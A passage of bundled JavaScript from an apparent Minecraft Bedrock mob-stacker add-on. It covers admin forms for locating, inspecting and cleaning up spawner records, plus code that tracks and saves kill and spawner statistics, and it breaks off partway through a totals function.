function extractStackSize(nameTag) {
  if (!nameTag)
    return 1;
  const match = nameTag.match(/x(\d+)/);
  return match ? parseInt(match[1], 10) : 1;
}
function getEntitiesInfoNearSpawner(x, y, z) {
  try {
    const overworld = world4.getDimension("overworld");
    const location = { x, y, z };
    const nearbyEntities = overworld.getEntities({
      location,
      maxDistance: 10
    });
    let physicalCount = 0;
    let virtualCount = 0;
    nearbyEntities.forEach((entity) => {
      if (entity?.isValid && entity.typeId.startsWith("mrleefy:")) {
        if (entity.nameTag && entity.nameTag.includes("x")) {
          physicalCount++;
          virtualCount += extractStackSize(entity.nameTag);
        }
      }
    });
    return { physicalCount, virtualCount };
  } catch (error) {
    return { physicalCount: 0, virtualCount: 0 };
  }
}
function openLocationSearchForm(player, allSpawners) {
  try {
    if (!player || !player.isValid)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const playerLocation = player.location;
    const playerX = Math.round(playerLocation.x);
    const playerZ = Math.round(playerLocation.z);
    const form = new ModalFormData2().title("Search Spawners by Location").toggle("Use current location", { defaultValue: true }).textField("X Coordinate", "Enter X coordinate", { defaultValue: playerX.toString() }).textField("Z Coordinate", "Enter Z coordinate", { defaultValue: playerZ.toString() }).slider("Search Radius", 10, 500, 10, 50).toggle("Include inactive spawners", { defaultValue: true });
    form.show(player).then((r) => {
      if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
        player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
        return;
      }
      if (r.canceled || !r.formValues)
        return;
      const useCurrentLocation = r.formValues[0];
      const enteredX = r.formValues[1];
      const enteredZ = r.formValues[2];
      const radius = r.formValues[3];
      const includeInactive = r.formValues[4];
      const searchX = useCurrentLocation ? playerX : parseInt(enteredX);
      const searchZ = useCurrentLocation ? playerZ : parseInt(enteredZ);
      if (isNaN(searchX) || isNaN(searchZ)) {
        player.sendMessage("\xA7cInvalid coordinates entered.");
        return;
      }
      const results = [];
      Object.entries(allSpawners).forEach(([coordinates, data]) => {
        try {
          const [x, y, z] = coordinates.split(",").map((coord) => parseFloat(coord.trim()));
          const distance = Math.sqrt(Math.pow(x - searchX, 2) + Math.pow(z - searchZ, 2));
          if (distance <= radius) {
            const info = getEntitiesInfoNearSpawner(x, y, z);
            if (info.physicalCount > 0 || includeInactive) {
              results.push({
                coordinates,
                data,
                distance,
                physicalCount: info.physicalCount,
                virtualCount: info.virtualCount,
                x,
                y,
                z
              });
            }
          }
        } catch (e) {
          console.error("Error matching distance search coords:", e);
        }
      });
      results.sort((a, b) => a.distance - b.distance);
      openLocationResultsForm(player, results, searchX, searchZ, radius);
    }).catch((error) => {
      console.error(`Error in openLocationSearchForm: ${error}`);
      player.sendMessage("\xA7cAn error occurred during search.");
    });
  } catch (error) {
    console.error(`Critical error in openLocationSearchForm: ${error}`);
    player.sendMessage("\xA7cA critical error occurred. Please try again.");
  }
}
function openLocationResultsForm(player, spawners, searchX, searchZ, radius) {
  try {
    if (!player || !player.isValid)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const validSpawners = [];
    const form = new ActionFormData2().title("Search Results").body(`Found ${spawners.length} spawners within ${radius} blocks of ${searchX}, ${searchZ}:`);
    spawners.forEach((result) => {
      const spawner = result.data;
      const status = result.physicalCount > 0 ? `\xA7a[Active: ${result.physicalCount} stack (${result.virtualCount} mobs)]` : "\xA78[Idle]";
      const typeId = spawner.typeId || "unknown";
      const levelMatch = typeId.match(/spawner(\d+)/);
      const level = levelMatch ? levelMatch[1] : "1";
      const mobType = typeId.replace("mrleefy:", "").replace(/spawner\d+/, "").replace(/_/g, "");
      const displayName = getMobDisplayName(`mrleefy:${mobType}still`) || "Unknown";
      const iconPath = getSpawnerIconPath(typeId, displayName);
      form.button(`${status} \xA77Lvl ${level} \xA7f${displayName}
\xA77Player: ${spawner.placedBy || "Unknown"} (${Math.round(result.distance)}m away)`, iconPath);
      validSpawners.push(result);
    });
    form.show(player).then((r) => {
      if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
        player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
        return;
      }
      if (r.canceled || r.selection === void 0)
        return;
      const selectedSpawner = validSpawners[r.selection];
      if (selectedSpawner) {
        teleportToSpawner(player, selectedSpawner.x, selectedSpawner.y, selectedSpawner.z);
      }
    }).catch((error) => {
      console.error(`Error in openLocationResultsForm: ${error}`);
      player.sendMessage("\xA7cAn error occurred while selecting spawner from search results.");
    });
  } catch (error) {
    console.error(`Critical error in openLocationResultsForm: ${error}`);
    player.sendMessage("\xA7cA critical error occurred. Please try again.");
  }
}
function getMobDisplayName(entityTypeId) {
  const found = validMobs.find((m) => m.typeId === entityTypeId);
  if (found) {
    return found.displayName;
  }
  const name = entityTypeId.replace("mrleefy:", "").replace("still", "");
  return name.charAt(0).toUpperCase() + name.slice(1);
}
function getSpawnerIconPath(typeId, displayName) {
  const cleanTypeId = typeId.replace(/\d+$/, "");
  const crawlerBlockMap = {
    "mrleefy:coalcrawlerspawner": "textures/blocks/iron",
    "mrleefy:ironcrawlerspawner": "textures/blocks/ironcrawlerspawner",
    "mrleefy:goldcrawlerspawner": "textures/blocks/goldcrawlerspawner",
    "mrleefy:diamondcrawlerspawner": "textures/blocks/diamondcrawlerspawner",
    "mrleefy:glowstonecrawlerspawner": "textures/blocks/gold",
    "mrleefy:obsidiancrawlerspawner": "textures/blocks/diamond",
    "mrleefy:icecrawlerspawner": "textures/blocks/emerald",
    "mrleefy:spongecrawlerspawner": "textures/blocks/netherite",
    "mrleefy:lapiscrawlerspawner": "textures/blocks/lapis",
    "mrleefy:redstonecrawlerspawner": "textures/blocks/redstone",
    "mrleefy:coppercrawlerspawner": "textures/blocks/copper",
    "mrleefy:quartzcrawlerspawner": "textures/blocks/quartz",
    "mrleefy:amethystcrawlerspawner": "textures/blocks/amethyst",
    // Also map still crawler types
    "mrleefy:coalcrawlerstill": "textures/blocks/iron",
    "mrleefy:ironcrawlerstill": "textures/blocks/ironcrawlerspawner",
    "mrleefy:goldcrawlerstill": "textures/blocks/goldcrawlerspawner",
    "mrleefy:diamondcrawlerstill": "textures/blocks/diamondcrawlerspawner",
    "mrleefy:glowstonecrawlerstill": "textures/blocks/gold",
    "mrleefy:obsidiancrawlerstill": "textures/blocks/diamond",
    "mrleefy:icecrawlerstill": "textures/blocks/emerald",
    "mrleefy:spongecrawlerstill": "textures/blocks/netherite",
    "mrleefy:lapiscrawlerstill": "textures/blocks/lapis",
    "mrleefy:redstonecrawlerstill": "textures/blocks/redstone",
    "mrleefy:coppercrawlerstill": "textures/blocks/copper",
    "mrleefy:quartzcrawlerstill": "textures/blocks/quartz",
    "mrleefy:amethystcrawlerstill": "textures/blocks/amethyst"
  };
  if (crawlerBlockMap[cleanTypeId]) {
    return `${crawlerBlockMap[cleanTypeId]}.png`;
  }
  let iconName = displayName.toLowerCase().replace(/ /g, "_");
  if (iconName === "wither_skeleton")
    iconName = "witherskeleton";
  return `textures/blocks/icons/${iconName}.png`;
}
function verifyAndCleanSpawnerDatabase(player) {
  try {
    if (!player || !player.isValid) {
      console.error("Invalid player provided to verifyAndCleanSpawnerDatabase");
      return;
    }
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const confirmForm = new MessageFormData().title("\xA74\xA7lDatabase Cleanup Warning").body(
      "\xA7c\xA7lWARNING:\xA7r\n\nThis operation will verify all spawners stored in the database by temporarily loading their chunks via ticking areas.\n\n\xA7eWhat it does:\xA7r\n\u2022 Checks if a spawner block actually exists at each stored location.\n\u2022 Deletes old spawner coordinates from the database if the block is gone.\n\u2022 Removes any orphaned/stuck stacked entities at those locations.\n\n\xA7cThis may cause temporary server lag during the scan.\xA7r\n\nAre you sure you want to proceed?"
    ).button1("\xA7aYes, Start Scan").button2("\xA7cNo, Cancel");
    confirmForm.show(player).then((r) => {
      if (r.canceled || r.selection !== 0) {
        player.sendMessage("\xA7eDatabase cleanup cancelled.");
        return;
      }
      player.sendMessage("\xA7aStarting database verification and cleanup...");
      player.sendMessage("\xA77This process runs in batches to prevent lag.");
      const overworld = world4.getDimension("overworld");
      const allSpawnerKeys = spawnerDatabase.keys();
      const totalCount = allSpawnerKeys.length;
      let currentIndex = 0;
      let verifiedSpawners = 0;
      let removedBlocks = 0;
      let removedEntities = 0;
      let processedCount = 0;
      const BATCH_SIZE = 5;
      const processBatch = () => {
        const batchLimit = Math.min(currentIndex + BATCH_SIZE, totalCount);
        for (let i = currentIndex; i < batchLimit; i++) {
          const coordinates = allSpawnerKeys[i];
          try {
            const [x, y, z] = coordinates.split(",").map((coord) => parseFloat(coord.trim()));
            const tickingAreaName = `db_verify_${x}_${y}_${z}`;
            player.runCommand(`tickingarea add ${x - 2} ${y - 2} ${z - 2} ${x + 2} ${y + 2} ${z + 2} ${tickingAreaName} true`);
            system3.runTimeout(() => {
              try {
                const block = overworld.getBlock({ x, y, z });
                if (!block || !(block.typeId.startsWith("mrleefy:") && block.typeId.includes("spawner") && !block.typeId.endsWith("_display"))) {
                  spawnerDatabase.delete(coordinates);
                  removedBlocks++;
                  debugLog2(`[CLEANUP] Deleted stale spawner coordinates from DB: ${coordinates}`);
                  const nearbyEntities = overworld.getEntities({
                    location: { x, y, z },
                    maxDistance: 8
                  });
                  nearbyEntities.forEach((entity) => {
                    if (entity?.isValid && entity.typeId.startsWith("mrleefy:") && entity.typeId.endsWith("still")) {
                      entity.remove();
                      removedEntities++;
                      debugLog2(`[CLEANUP] Removed orphaned spawnrule entity: ${entity.typeId} at ${coordinates}`);
                    }
                  });
                } else {
                  verifiedSpawners++;
                }
                try {
                  player.runCommand(`tickingarea remove ${tickingAreaName}`);
                } catch (e) {
                }
              } catch (blockError) {
                console.error(`Error checking block at ${coordinates}:`, blockError);
                try {
                  player.runCommand(`tickingarea remove ${tickingAreaName}`);
                } catch (e) {
                }
              }
              processedCount++;
              if (processedCount % 10 === 0 || processedCount === totalCount) {
                player.sendMessage(`\xA77Progress: ${processedCount}/${totalCount} spawners checked...`);
              }
              if (currentIndex + BATCH_SIZE < totalCount) {
                currentIndex += BATCH_SIZE;
                system3.runTimeout(() => {
                  processBatch();
                }, 20);
              } else if (processedCount === totalCount) {
                reportVerificationResults(player, verifiedSpawners, removedBlocks, removedEntities);
              }
            }, 2);
          } catch (error) {
            console.error(`Error processing spawner at ${coordinates}:`, error);
            processedCount++;
          }
        }
      };
      if (totalCount > 0) {
        processBatch();
      } else {
        player.sendMessage("\xA7eNo spawners found in database.");
      }
    }).catch((confirmError) => {
      console.error(`Error in cleanup confirmation form: ${confirmError}`);
    });
  } catch (error) {
    console.error(`Error in verifyAndCleanSpawnerDatabase: ${error}`);
    player.sendMessage("\xA7cAn error occurred while verifying the database.");
  }
}
function reportVerificationResults(player, verifiedSpawners, removedBlocks, removedEntities) {
  try {
    player.sendMessage(`\xA7a\u2713 Database verification complete!`);
    player.sendMessage(`\xA77Verified: \xA7a${verifiedSpawners} \xA77spawners`);
    if (removedBlocks > 0) {
      player.sendMessage(`\xA77Removed: \xA7c${removedBlocks} \xA77stale database entries`);
    }
    if (removedEntities > 0) {
      player.sendMessage(`\xA77Cleaned: \xA7c${removedEntities} \xA77orphaned spawnrule entities`);
    }
    if (removedBlocks === 0 && removedEntities === 0) {
      player.sendMessage(`\xA7aDatabase is clean - no issues found!`);
    }
  } catch (error) {
    console.error(`Error reporting verification results: ${error}`);
  }
}
function openPlayerStatsSelectionForm(player) {
  try {
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const playerSpawners = /* @__PURE__ */ new Map();
    const allSpawnerKeys = spawnerDatabase.keys();
    for (const key of allSpawnerKeys) {
      const spawnerData = spawnerDatabase.read(key);
      if (spawnerData && spawnerData.placedBy) {
        const playerName = spawnerData.placedBy;
        if (!playerSpawners.has(playerName)) {
          playerSpawners.set(playerName, []);
        }
        playerSpawners.get(playerName).push({
          location: key,
          typeId: spawnerData.typeId,
          placedAt: spawnerData.placedAt,
          entitiesKilled: spawnerData.entitiesKilled || 0
        });
      }
    }
    if (playerSpawners.size === 0) {
      player.sendMessage("\xA7cNo spawner data found in the database.");
      return;
    }
    const sortedPlayers = Array.from(playerSpawners.entries()).sort((a, b) => b[1].length - a[1].length);
    const form = new ActionFormData2().title("Select Player for Detailed Stats").body(`Found ${playerSpawners.size} players with spawners. Select a player to view their detailed spawner information:`);
    for (const [playerName, spawners] of sortedPlayers) {
      let totalPhysical = 0;
      let totalVirtual = 0;
      spawners.forEach((spawner) => {
        const [x, y, z] = spawner.location.split(",").map(Number);
        const info = getEntitiesInfoNearSpawner(x, y, z);
        totalPhysical += info.physicalCount;
        totalVirtual += info.virtualCount;
      });
      const avgLevel = spawners.reduce((sum, spawner) => {
        const levelMatch = spawner.typeId.match(/spawner(\d+)/);
        return sum + (levelMatch ? parseInt(levelMatch[1]) : 1);
      }, 0) / spawners.length;
      form.button(`\xA7e${playerName}
\xA78${spawners.length} spawners \u2022 ${totalPhysical} stacks (${totalVirtual} mobs) \u2022 Avg Level ${avgLevel.toFixed(1)}`, "textures/items/name_tag");
    }
    form.show(player).then((r) => {
      if (r.canceled || r.selection === void 0)
        return;
      if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
        player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
        return;
      }
      const selectedPlayerData = sortedPlayers[r.selection];
      if (selectedPlayerData) {
        const [selectedPlayer, spawners] = selectedPlayerData;
        const spawnerDetails = spawners.map((spawner) => {
          let x = 0, y = 0, z = 0;
          try {
            if (spawner.location && typeof spawner.location === "string") {
              const coords = spawner.location.split(",").map((coord) => parseFloat(coord.trim()));
              if (coords.length >= 3 && coords.every((coord) => !isNaN(coord))) {
                [x, y, z] = coords;
              }
            }
          } catch (error) {
            debugLog2(`Error parsing location for spawner: ${spawner.location}, error: ${error}`);
          }
          const typeId = spawner.typeId || "unknown_spawner";
          const levelMatch = typeId.match(/spawner(\d+)/);
          const level = levelMatch ? parseInt(levelMatch[1]) : 1;
          const mobType = typeId.replace("mrleefy:", "").replace(/spawner\d+/, "").replace(/_/g, "");
          const displayName = getMobDisplayName(`mrleefy:${mobType}still`) || "Unknown";
          const info = getEntitiesInfoNearSpawner(x, y, z);
          return {
            ...spawner,
            displayName,
            level,
            physicalEntities: info.physicalCount,
            virtualEntities: info.virtualCount,
            x,
            y,
            z
          };
        });
        openSpawnerInfoForm(player, selectedPlayer, spawnerDetails);
      }
    }).catch((error) => {
      console.error(`Error in openPlayerStatsSelectionForm: ${error}`);
      player.sendMessage("\xA7cAn error occurred while showing player selection.");
    });
  } catch (error) {
    console.error(`Critical error in openPlayerStatsSelectionForm: ${error}`);
    player.sendMessage("\xA7cA critical error occurred. Please try again.");
  }
}
function openSpawnerInfoForm(player, playerName, spawnerDetails) {
  try {
    if (!player || !player.isValid)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      return;
    }
    const totalSpawners = spawnerDetails.length;
    const totalPhysicalEntities = spawnerDetails.reduce((sum, s) => sum + s.physicalEntities, 0);
    const totalVirtualEntities = spawnerDetails.reduce((sum, s) => sum + s.virtualEntities, 0);
    const avgLevel = totalSpawners > 0 ? spawnerDetails.reduce((sum, s) => sum + s.level, 0) / totalSpawners : 0;
    const activeSpawners = spawnerDetails.filter((s) => s.physicalEntities > 0).length;
    const totalKills = spawnerDetails.reduce((sum, s) => sum + (s.entitiesKilled || 0), 0);
    const typeDistribution = {};
    spawnerDetails.forEach((spawner) => {
      const type = spawner.displayName;
      typeDistribution[type] = (typeDistribution[type] || 0) + 1;
    });
    const topType = Object.entries(typeDistribution).sort((a, b) => b[1] - a[1])[0];
    let infoText = `**${playerName}'s Spawner Overview**

`;
    infoText += `**Summary:**
`;
    infoText += `\u2022 Total Spawners: ${totalSpawners}
`;
    infoText += `\u2022 Active Spawners: ${activeSpawners}/${totalSpawners} (${totalSpawners > 0 ? (activeSpawners / totalSpawners * 100).toFixed(1) : "0.0"}%)
`;
    infoText += `\u2022 Total Mob Stacks Nearby: ${totalPhysicalEntities} (Physical entities alive)
`;
    infoText += `\u2022 Total Mobs inside Stacks: ${totalVirtualEntities} (Sum of stack sizes)
`;
    infoText += `\u2022 Average Level: ${avgLevel.toFixed(1)}
`;
    infoText += `\u2022 Total Kills: ${totalKills}

`;
    infoText += `**Spawner Types:**
`;
    Object.entries(typeDistribution).sort((a, b) => b[1] - a[1]).forEach(([type, count]) => {
      infoText += `\u2022 ${type}: ${count}
`;
    });
    infoText += `
Top Performer: ${topType ? `${topType[0]} (${topType[1]} spawners)` : "None"}

`;
    infoText += `Individual Spawner Details:
`;
    spawnerDetails.sort((a, b) => b.physicalEntities - a.physicalEntities).slice(0, 5).forEach((spawner, index) => {
      const status = spawner.physicalEntities > 0 ? "[ACTIVE]" : "[IDLE]";
      const placedTime = spawner.hasOwnProperty("placedAt") && spawner.placedAt ? new Date(spawner.placedAt).toLocaleDateString() : "Unknown";
      infoText += `${index + 1}. ${status} ${spawner.displayName} Level ${spawner.level} Cord: ${spawner.x}, ${spawner.y}, ${spawner.z}
`;
      infoText += `   ${spawner.physicalEntities} stacks (${spawner.virtualEntities} mobs) \u2022 ${spawner.entitiesKilled || 0} kills \u2022 Placed: ${placedTime}
`;
    });
    const form = new ActionFormData2().title(`${playerName}'s Spawner Information`).body(infoText).button("\xA7cClose");
    form.show(player).then((response) => {
    }).catch((error) => {
      console.error(`Error in openSpawnerInfoForm: ${error}`);
      player.sendMessage("\xA7cAn error occurred while showing spawner information.");
    });
  } catch (error) {
    console.error(`Critical error in openSpawnerInfoForm: ${error}`);
    player.sendMessage("\xA7cA critical error occurred. Please try again.");
  }
}

// src/mobstacker-core.ts
var performanceMetrics = {
  stackingOperations: 0,
  entitySpawns: 0,
  entityRemovals: 0,
  averageProcessingTime: 0,
  lastReset: Date.now(),
  peakMemoryUsage: 0,
  warningCount: 0,
  criticalCount: 0
};
var spawnerStatistics = {
  totalSpawners: 0,
  totalEntities: 0,
  // physical stacks
  totalVirtualEntities: 0,
  // virtual mobs
  entitiesKilled: /* @__PURE__ */ new Map(),
  // Per entity type
  spawnerUptime: /* @__PURE__ */ new Map(),
  // Per spawner location
  playerStats: /* @__PURE__ */ new Map(),
  // Per player statistics
  lastStatsUpdate: Date.now()
};
var STATS_MEMORY_LIMITS = {
  MAX_ENTITY_TYPES: 1e3,
  // Max entity types to track
  MAX_PLAYER_ENTRIES: 500,
  // Max players to track
  MAX_SPAWNER_ENTRIES: 2e3,
  // Max spawner locations to track
  STATS_CLEANUP_INTERVAL: 36e5,
  // 1 hour in milliseconds
  PLAYER_INACTIVITY_THRESHOLD: 30 * 24 * 60 * 60 * 1e3
  // 30 days
};
var LOGGING_ENABLED = false;
var originalConsoleLog = console.log;
console.log = function(...args) {
  if (LOGGING_ENABLED) {
    originalConsoleLog.apply(console, args);
  }
};
function debugLog2(message, ...args) {
  if (LOGGING_ENABLED) {
    console.log(`[DEBUG] ${message}`, ...args);
  }
}
function enableLogging() {
  LOGGING_ENABLED = true;
  originalConsoleLog("[MOBSTACKER] Logging enabled");
}
function disableLogging() {
  originalConsoleLog("[MOBSTACKER] Logging disabled");
  LOGGING_ENABLED = false;
}
function isLoggingEnabled() {
  return LOGGING_ENABLED;
}
var entitySpawnerMap = /* @__PURE__ */ new Map();
function cleanupStatistics() {
  const now = Date.now();
  if (spawnerStatistics.entitiesKilled.size > STATS_MEMORY_LIMITS.MAX_ENTITY_TYPES) {
    const entries = Array.from(spawnerStatistics.entitiesKilled.entries());
    entries.sort((a, b) => b[1] - a[1]);
    spawnerStatistics.entitiesKilled.clear();
    entries.slice(0, STATS_MEMORY_LIMITS.MAX_ENTITY_TYPES).forEach(([entityType, kills]) => {
      spawnerStatistics.entitiesKilled.set(entityType, kills);
    });
  }
  if (spawnerStatistics.spawnerUptime.size > STATS_MEMORY_LIMITS.MAX_SPAWNER_ENTRIES) {
    const entries = Array.from(spawnerStatistics.spawnerUptime.entries());
    entries.sort((a, b) => b[1] - a[1]);
    spawnerStatistics.spawnerUptime.clear();
    entries.slice(0, STATS_MEMORY_LIMITS.MAX_SPAWNER_ENTRIES).forEach(([location, uptime]) => {
      spawnerStatistics.spawnerUptime.set(location, uptime);
    });
  }
  if (spawnerStatistics.playerStats.size > STATS_MEMORY_LIMITS.MAX_PLAYER_ENTRIES) {
    const cutoffTime = now - STATS_MEMORY_LIMITS.PLAYER_INACTIVITY_THRESHOLD;
    for (const [playerName, stats] of spawnerStatistics.playerStats.entries()) {
      if (stats.lastActivity && stats.lastActivity < cutoffTime) {
        spawnerStatistics.playerStats.delete(playerName);
      }
    }
  }
  debugLog2(`Statistics cleanup: entities=${spawnerStatistics.entitiesKilled.size}, players=${spawnerStatistics.playerStats.size}, spawners=${spawnerStatistics.spawnerUptime.size}`);
}
function updateSpawnerStatisticsDirect(entityTypeId, locationKey, player) {
  const currentKills = spawnerStatistics.entitiesKilled.get(entityTypeId) || 0;
  spawnerStatistics.entitiesKilled.set(entityTypeId, currentKills + 1);
  const currentUptime = spawnerStatistics.spawnerUptime.get(locationKey) || 0;
  spawnerStatistics.spawnerUptime.set(locationKey, currentUptime + 1);
  updateSpawnerMetadata(locationKey, entityTypeId, player);
  if (player) {
    const playerName = player.name || player.nameTag || "Unknown";
    const playerStat = spawnerStatistics.playerStats.get(playerName) || {
      entitiesKilled: 0,
      spawnersPlaced: 0,
      killsByType: {},
      lastActivity: Date.now()
    };
    playerStat.entitiesKilled++;
    playerStat.lastActivity = Date.now();
    playerStat.killsByType[entityTypeId] = (playerStat.killsByType[entityTypeId] || 0) + 1;
    spawnerStatistics.playerStats.set(playerName, playerStat);
  }
}
var pendingSpawnerMetadata = /* @__PURE__ */ new Map();
function updateSpawnerMetadata(locationKey, entityTypeId, player) {
  try {
    let pending = pendingSpawnerMetadata.get(locationKey);
    if (!pending) {
      pending = {
        entityTypeId,
        kills: 0,
        playersKilled: {},
        lastKill: Date.now()
      };
      pendingSpawnerMetadata.set(locationKey, pending);
    }
    pending.kills++;
    pending.lastKill = Date.now();
    if (player) {
      const playerName = player.name || player.nameTag || "Unknown";
      pending.playersKilled[playerName] = (pending.playersKilled[playerName] || 0) + 1;
    }
  } catch (error) {
    console.error(`Error buffering spawner metadata for ${locationKey}:`, error);
  }
}
function flushPendingSpawnerMetadata() {
  if (pendingSpawnerMetadata.size === 0)
    return;
  for (const [locationKey, pending] of pendingSpawnerMetadata.entries()) {
    try {
      const existingData = spawnerDatabase2.read(locationKey) || {
        entitiesKilled: 0,
        killsByType: {},
        playersKilled: {},
        lastKill: 0,
        lastAccessed: 0
      };
      existingData.entitiesKilled += pending.kills;
      existingData.lastKill = pending.lastKill;
      existingData.lastAccessed = Date.now();
      if (!existingData.killsByType) {
        existingData.killsByType = {};
      }
      existingData.killsByType[pending.entityTypeId] = (existingData.killsByType[pending.entityTypeId] || 0) + pending.kills;
      if (!existingData.playersKilled) {
        existingData.playersKilled = {};
      }
      for (const [playerName, count] of Object.entries(pending.playersKilled)) {
        existingData.playersKilled[playerName] = (existingData.playersKilled[playerName] || 0) + count;
      }
      spawnerDatabase2.write(locationKey, existingData);
    } catch (error) {
      console.error(`Error saving spawner metadata for ${locationKey}:`, error);
    }
  }
  pendingSpawnerMetadata.clear();
  debugLog2("[MOBSTACKER] Flushed pending spawner metadata to database");
}
system4.runInterval(() => {
  try {
    cleanupStatistics();
    flushPendingSpawnerMetadata();
    saveSpawnerStatistics();
  } catch (error) {
    console.error("Error in persistent statistics sync:", error);
  }
}, 30 * 20);
function saveSpawnerStatistics() {
  try {
    const entitiesKilledEntries = spawnerStatistics.entitiesKilled instanceof Map ? Array.from(spawnerStatistics.entitiesKilled.entries()) : [];
    const spawnerUptimeEntries = spawnerStatistics.spawnerUptime instanceof Map ? Array.from(spawnerStatistics.spawnerUptime.entries()) : [];
    const playerStatsEntries = spawnerStatistics.playerStats instanceof Map ? Array.from(spawnerStatistics.playerStats.entries()) : [];
    const statsObj = {
      entitiesKilled: entitiesKilledEntries,
      spawnerUptime: spawnerUptimeEntries,
      playerStats: playerStatsEntries,
      lastStatsUpdate: spawnerStatistics.lastStatsUpdate
    };
    configDatabase2.write("spawnerStatistics", statsObj);
  } catch (error) {
    console.error("Failed to save spawner statistics:", error);
  }
}
function loadSpawnerStatistics() {
  try {
    const statsObj = configDatabase2.read("spawnerStatistics");
    if (statsObj) {
      if (statsObj.entitiesKilled && Array.isArray(statsObj.entitiesKilled)) {
        spawnerStatistics.entitiesKilled = new Map(statsObj.entitiesKilled);
      } else if (statsObj.entitiesKilled && typeof statsObj.entitiesKilled === "object") {
        spawnerStatistics.entitiesKilled = new Map(Object.entries(statsObj.entitiesKilled));
      } else {
        spawnerStatistics.entitiesKilled = /* @__PURE__ */ new Map();
      }
      if (statsObj.spawnerUptime && Array.isArray(statsObj.spawnerUptime)) {
        spawnerStatistics.spawnerUptime = new Map(statsObj.spawnerUptime);
      } else if (statsObj.spawnerUptime && typeof statsObj.spawnerUptime === "object") {
        spawnerStatistics.spawnerUptime = new Map(Object.entries(statsObj.spawnerUptime));
      } else {
        spawnerStatistics.spawnerUptime = /* @__PURE__ */ new Map();
      }
      if (statsObj.playerStats && Array.isArray(statsObj.playerStats)) {
        spawnerStatistics.playerStats = new Map(statsObj.playerStats);
      } else if (statsObj.playerStats && typeof statsObj.playerStats === "object") {
        spawnerStatistics.playerStats = new Map(Object.entries(statsObj.playerStats));
      } else {
        spawnerStatistics.playerStats = /* @__PURE__ */ new Map();
      }
      spawnerStatistics.lastStatsUpdate = statsObj.lastStatsUpdate || Date.now();
    } else {
      if (!(spawnerStatistics.entitiesKilled instanceof Map))
        spawnerStatistics.entitiesKilled = /* @__PURE__ */ new Map();
      if (!(spawnerStatistics.spawnerUptime instanceof Map))
        spawnerStatistics.spawnerUptime = /* @__PURE__ */ new Map();
      if (!(spawnerStatistics.playerStats instanceof Map))
        spawnerStatistics.playerStats = /* @__PURE__ */ new Map();
    }
  } catch (error) {
    console.error("Failed to load spawner statistics:", error);
    if (!(spawnerStatistics.entitiesKilled instanceof Map))
      spawnerStatistics.entitiesKilled = /* @__PURE__ */ new Map();
    if (!(spawnerStatistics.spawnerUptime instanceof Map))
      spawnerStatistics.spawnerUptime = /* @__PURE__ */ new Map();
    if (!(spawnerStatistics.playerStats instanceof Map))
      spawnerStatistics.playerStats = /* @__PURE__ */ new Map();
  }
}
function resetSpawnerStatistics() {
  try {
    if (!(spawnerStatistics.entitiesKilled instanceof Map)) {
      spawnerStatistics.entitiesKilled = /* @__PURE__ */ new Map();
    } else {
      spawnerStatistics.entitiesKilled.clear();
    }
    if (!(spawnerStatistics.spawnerUptime instanceof Map)) {
      spawnerStatistics.spawnerUptime = /* @__PURE__ */ new Map();
    } else {
      spawnerStatistics.spawnerUptime.clear();
    }
    if (!(spawnerStatistics.playerStats instanceof Map)) {
      spawnerStatistics.playerStats = /* @__PURE__ */ new Map();
    } else {
      spawnerStatistics.playerStats.clear();
    }
    spawnerStatistics.totalSpawners = 0;
    spawnerStatistics.totalEntities = 0;
    spawnerStatistics.lastStatsUpdate = Date.now();
    saveSpawnerStatistics();
  } catch (error) {
    console.error("Failed to reset spawner statistics:", error);
  }
}
function getPlayerTopKills(playerStat, count = 3) {
  if (!playerStat || !playerStat.killsByType)
    return [];
  return Object.entries(playerStat.killsByType).sort((a, b) => b[1] - a[1]).slice(0, count).map(([typeId, killsCount]) => ({
    displayName: mobDisplayNameMap.get(typeId) || typeId.replace("mrleefy:", ""),
    count: killsCount
  }));
}
function calculateSpawnerTotals() {
  const dimensions = ["overworld", "nether", "the_end"];
  let spawnerCount = 0;
  let physicalCount = 0;
  let virtualCount = 0;
  const validMobs2 = [
    "mrleefy:blazestill",
    "mrleefy:cowstill",
    "mrleefy:sheepstill",
    "mrleefy:pigstill",
    "mrleefy:chickenstill",
    "mrleefy:emeraldgolemstill",
    "mrleefy:netheritegolemstill",
    "mrleefy:irongolemstill",
    "mrleefy:diamondgolemstill",
    "mrleefy:goldgolemstill",
    "mrleefy:endermanstill",
    "mrleefy:creeperstill",
    "mrleefy:magmacubestill",
    "mrleefy:guardianstill",
    "mrleefy:witherskeletonstill",
    "mrleefy:zombiestill",
    "mrleefy:witherstill",
    "mrleefy:spiderstill",
    "mrleefy:slimestill",
    "mrleefy:vindicatorstill",
    "mrleefy:skeletonstill",
    "mrleefy:shulkerstill",
    "mrleefy:breezestill",
    "mrleefy:piglinbrutestill",
    "mrleefy:wardenstill",
    "mrleefy:ravagerstill",
    "mrleefy:snowmanstill",
    // Crawlers
    "mrleefy:coalcrawlerstill",
    "mrleefy:glowstonecrawlerstill",
    "mrleefy:obsidiancrawlerstill",
    "mrleefy:icecrawlerstill",
    "mrleefy:spongecrawlerstill",
    "mrleefy:lapiscrawlerstill",
    "mrleefy:redstonecrawlerstill",
    "mrleefy:coppercrawlerstill",
    "mrleefy:quartzcrawlerstill",
    "mrleefy:amethystcrawlerstill"
  ];
  for (const dimId of dimensions) {
    try {
      const dim = world5.getDimension(dimId);
      if (dim) {
        const spawnruleEntities = dim.getEntities({ type: ENTITIES.SPAWNRULE_ENTITY_TYPE });
        spawnerCount += spawnruleEntities.length;
